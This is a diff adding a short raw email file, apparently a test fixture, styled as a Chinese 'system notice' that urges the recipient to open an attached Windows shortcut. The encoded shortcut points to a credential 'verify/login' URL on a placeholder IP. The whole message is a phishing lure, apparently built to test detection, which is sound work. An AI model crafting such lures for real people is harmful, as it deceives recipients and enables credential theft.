@@ -1,0 +1,19 @@
+From: =?utf-8?B?5rWL6K+V5pSv5oyB?= <it-support@partner.example>
+To: employee@corp.internal
+Date: Thu, 13 Aug 2026 10:00:00 +0800
+Message-ID: <ev47@partner.example>
+Subject: 系统通知
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+您好，请打开附件访问详情。--BS
+Content-Type: application/x-ms-shortcut
+Content-Disposition: attachment; filename="details.lnk"
+Content-Transfer-Encoding: base64
+
+TAAAAAEUAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaHR0cDovLzIwMy4wLjExMy42MC92ZXJpZnkvbG9naW4A
+--BS--
+
